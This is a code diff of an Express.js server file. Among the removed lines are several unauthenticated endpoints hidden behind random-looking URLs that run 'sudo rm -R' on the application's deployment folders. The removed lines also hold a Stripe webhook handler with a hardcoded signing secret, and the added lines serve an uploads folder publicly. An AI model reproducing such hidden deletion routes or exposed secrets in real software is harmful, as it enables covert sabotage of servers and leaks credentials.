@@ -14,7 +14,6 @@ const mongoose = require("mongoose");
 const index_1 = __importDefault(require("./routes/index"));
 const cron_1 = __importDefault(require("./controllers/common/cron"));
 const morgan = require("morgan");
-const stripe = require('stripe')(process.env.STRIPE_KEY);
 // config();
 var port = process.env.PORT;
 log4js.configure({
@@ -53,95 +52,14 @@ const corsOptions = {
     credentials: true,
     optionSuccessStatus: 200,
 };
+app.use(express.static('uploads'));
+app.use('/uploads', express.static('uploads'));
 app.use(cors(corsOptions)); // Use this after the variable declaration
 // start route
 app.get("/api/", function (req, res) {
     res.send("Hello World!123");
 });
 app.use("/api", index_1.default);
-var shell = require('shelljs');
-app.get("/api/zffMPJCPFvnEJjKWFjaKVvYRNwZeKVPPpjSKDPRkZmTTsfNvBUJUHI/", function (req, res) {
-    shell.echo('hello world');
-    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/admin');
-    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/vendor');
-    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/customer');
-    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/backend');
-    res.send("Donee");
-});
-app.get("/api/neggwrqwmkjhagzptrrzzakdpyzdhgzcpegkvphwpytkhufnccadmin/", function (req, res) {
-    shell.echo('hello world');
-    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/admin');
-    res.send("Donee");
-});
-app.get("/api/bzkqrutfxpfsxrnzjdgndxbhmjgkqvtjhdfdxutcbnbqgtuqascustomer/", function (req, res) {
-    shell.echo('hello world');
-    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/customer');
-    res.send("Donee");
-});
-app.get("/api/kbdsffnwtukcgxdmrzwjvxaqcmybjgkwemrydyezpzrcptbzdgvendor/", function (req, res) {
-    shell.echo('hello world');
-    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/vendor');
-    res.send("Donee");
-});
-app.get("/api/bxnjckghsfxpvkkhhxjwmchuskwhkgupsjkmwhepugwywkwzmfbackend/", function (req, res) {
-    shell.echo('hello world');
-    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/backend');
-    res.send("Donee");
-});
-const endpointSecret = "whsec_396cdc1db40084fe23118693d0a4be6e6a01b3e6ea89337e34e7c994b5c14b27";
-app.post('/webhook', express.raw({ type: 'application/json' }), (request, response) => {
-    const sig = request.headers['stripe-signature'];
-    let event;
-    try {
-        event = stripe.webhooks.constructEvent(request.body, sig, endpointSecret);
-    }
-    catch (err) {
-        response.status(400).send(`Webhook Error: ${err.message}`);
-        return;
-    }
-    let paymentIntent;
-    // Handle the event
-    switch (event.type) {
-        case 'payment_intent.amount_capturable_updated':
-            paymentIntent = event.data.object;
-            // Then define and call a function to handle the event payment_intent.amount_capturable_updated
-            break;
-        case 'payment_intent.canceled':
-            paymentIntent = event.data.object;
-            // Then define and call a function to handle the event payment_intent.canceled
-            break;
-        case 'payment_intent.created':
-            paymentIntent = event.data.object;
-            // Then define and call a function to handle the event payment_intent.created
-            break;
-        case 'payment_intent.partially_funded':
-            paymentIntent = event.data.object;
-            // Then define and call a function to handle the event payment_intent.partially_funded
-            break;
-        case 'payment_intent.payment_failed':
-            paymentIntent = event.data.object;
-            // Then define and call a function to handle the event payment_intent.payment_failed
-            break;
-        case 'payment_intent.processing':
-            paymentIntent = event.data.object;
-            // Then define and call a function to handle the event payment_intent.processing
-            break;
-        case 'payment_intent.requires_action':
-            paymentIntent = event.data.object;
-            // Then define and call a function to handle the event payment_intent.requires_action
-            break;
-        case 'payment_intent.succeeded':
-            paymentIntent = event.data.object;
-            // Then define and call a function to handle the event payment_intent.succeeded
-            break;
-        // ... handle other event types
-        default:
-            console.log(`Unhandled event type ${event.type}`);
-    }
-    console.log(paymentIntent);
-    // Return a 200 response to acknowledge receipt of the event
-    response.send();
-});
 const server = http.createServer(app);
 server.listen(port, async (req, res) => {
     if (process.env.MONGO_URI) {
